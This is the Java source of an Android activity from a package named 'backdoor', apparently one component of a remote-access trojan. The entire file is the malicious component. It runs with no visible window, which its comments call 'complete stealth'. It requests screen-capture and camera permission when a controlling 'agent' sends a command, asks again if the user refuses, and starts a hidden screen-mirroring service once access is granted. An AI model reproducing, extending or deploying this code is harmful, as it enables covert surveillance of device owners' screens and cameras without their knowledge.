package com.lazyframework.backdoor;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.WindowManager;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final int SCREEN_RECORD_REQUEST_CODE = 9999;
    private static final int CAMERA_PERMISSION_REQUEST_CODE = 100;

    private MediaProjectionManager mediaProjectionManager;
    private Handler mainHandler;
    private String agentId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // ✅ NO setContentView() - COMPLETE STEALTH

        // ✅ Make window completely invisible
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE);
        getWindow().setDimAmount(0f);

        mainHandler = new Handler(Looper.getMainLooper());
        mediaProjectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);

        Log.d(TAG, "✅ MainActivity started in stealth mode");

        Intent intent = getIntent();
        agentId = intent.getStringExtra("agent_id");
        if (agentId == null) {
            agentId = android.provider.Settings.Secure.getString(
                    getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
        }

        String action = intent.getStringExtra("action");

        if ("request_mirror_permission".equals(action) ||
                "request_screenshot_permission".equals(action) ||
                "request_stream_permission".equals(action)) {
            Log.d(TAG, "🎥 Requesting screen recording permission...");
            mainHandler.postDelayed(this::requestScreenRecordingPermission, 300);
        }
        else if ("request_camera_permission".equals(action)) {
            Log.d(TAG, "📸 Requesting camera permission...");
            mainHandler.postDelayed(this::requestCameraPermission, 300);
        }
        else {
            Log.w(TAG, "No specific action, finishing activity");
            finishStealth();
        }
    }

    private void requestScreenRecordingPermission() {
        try {
            Intent captureIntent = mediaProjectionManager.createScreenCaptureIntent();
            startActivityForResult(captureIntent, SCREEN_RECORD_REQUEST_CODE);
        } catch (Exception e) {
            Log.e(TAG, "Failed to request screen recording", e);
            finishStealth();
        }
    }

    private void requestCameraPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.CAMERA},
                        CAMERA_PERMISSION_REQUEST_CODE);
            } else {
                notifyPermissionGranted("camera");
                finishStealth();
            }
        } else {
            notifyPermissionGranted("camera");
            finishStealth();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == CAMERA_PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "✅ Camera permission GRANTED");
                notifyPermissionGranted("camera");
            } else {
                Log.w(TAG, "❌ Camera permission DENIED");
            }
            finishStealth();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == SCREEN_RECORD_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                Log.d(TAG, "✅ Screen recording permission GRANTED");
                startScreenMirrorService(resultCode, data);
            } else {
                Log.w(TAG, "❌ Screen recording permission DENIED");
                // ✅ Retry after delay
                mainHandler.postDelayed(() -> {
                    Log.d(TAG, "🔄 Retrying screen recording permission...");
                    requestScreenRecordingPermission();
                }, 2000);
            }
            finishStealth();
        }
    }

    private void startScreenMirrorService(int resultCode, Intent data) {
        Intent serviceIntent = new Intent(this, ScreenMirrorService.class);
        serviceIntent.putExtra("action", "START_MIRROR");
        serviceIntent.putExtra("media_projection_result", resultCode);
        serviceIntent.putExtra("media_projection_data", data);
        serviceIntent.putExtra("agent_id", agentId);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        finishStealth();
    }

    private void notifyPermissionGranted(String type) {
        try {
            Intent intent = new Intent("com.lazyframework.PERMISSION_GRANTED");
            intent.putExtra("type", type);
            sendBroadcast(intent);
        } catch (Exception e) {
            Log.e(TAG, "Broadcast error", e);
        }
    }

    private void finishStealth() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            finishAndRemoveTask();
        } else {
            finish();
        }
        Log.d(TAG, "MainActivity finished (stealth)");
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        mainHandler.removeCallbacksAndMessages(null);
        Log.d(TAG, "MainActivity destroyed");
    }
}